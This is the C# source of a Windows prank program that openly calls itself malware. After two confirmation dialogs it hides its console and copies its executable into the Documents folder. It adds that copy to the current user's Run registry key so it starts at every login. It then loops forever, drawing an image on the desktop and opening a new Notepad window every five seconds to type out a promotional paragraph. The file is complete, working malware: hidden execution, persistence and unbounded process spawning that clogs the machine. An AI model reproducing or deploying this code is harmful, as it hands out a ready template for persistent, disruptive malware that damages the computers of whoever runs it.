using System;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;
using System.Drawing;
using Microsoft.Win32;

namespace MyFriendScott {
    class Program {

        [DllImport("User32.dll")]
        public static extern IntPtr GetDC(IntPtr hwnd);
        [DllImport("User32.dll")]
        public static extern void ReleaseDC(IntPtr hwnd, IntPtr dc);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("User32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("User32.dll")]
        static extern bool SetActiveWindow(IntPtr hWnd);
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static void Main(string[] args) {

            /*
             * My friend Scott started and runs one of the fastest growing charities in the WORLD.
             * With over 100 people on staff in New York City and a visual brand that rivals
             * the best, Scott and I discuss what it takes to launch a thriving charity.
             */

            Console.Title = "scott";
            ShowWindow(GetConsoleWindow(), SW_HIDE);
            
            const string keyName = "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

            if (Registry.GetValue(keyName, "Scott", null) == null) {

                DialogResult firstConfirm = 
                    MessageBox.Show("This program is malware, are you sure you want to run it?", "", MessageBoxButtons.YesNo);
                switch (firstConfirm) {
                    case DialogResult.Yes:
                        DialogResult secondConfirm = 
                            MessageBox.Show("This program will harm your computer, are you 100% sure?", "", MessageBoxButtons.YesNo);
                        switch (secondConfirm) {
                            case DialogResult.Yes:
                                MessageBox.Show("Scott be with you.", "");
                                break;
                            case DialogResult.No:
                                return;
                        }
                        break;
                    case DialogResult.No:
                        return;
                }

                string currentLoc = System.Reflection.Assembly.GetEntryAssembly().Location;
                string documents = System.Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

                if (System.IO.Directory.Exists(documents + "\\mfs")) {
                    System.IO.Directory.Delete(documents + "\\mfs", true);
                }

                try {
                    System.IO.Directory.CreateDirectory(documents + "\\mfs");
                } finally {
                    System.IO.File.Copy(currentLoc, documents + "\\mfs\\scott.exe");
                }

                Registry.SetValue(keyName, "Scott", documents + "\\mfs\\scott.exe");

            }

            IntPtr desktopPtr = GetDC(IntPtr.Zero);
            Graphics g = Graphics.FromHdc(desktopPtr);

            Random rand = new Random();

            string scottText = "My friend Scott started and runs one of the fastest growing charities in the WORLD. " + 
                               "With over 100 people on staff in New York City and a visual brand that rivals the best, " + 
                               " Scott and I discuss what it takes to launch a thriving charity.";

            Thread.Sleep(15000);

            while(true) {
                Bitmap bit = new Bitmap(MyFriendScott.Properties.Resources.scott);
                g.DrawImage(bit, new Point(rand.Next(1, 500), rand.Next(1, 500)));
                Process.Start("notepad.exe");
                SendKeys.SendWait(scottText);

                Thread.Sleep(5000);
            }
        }
    }
}
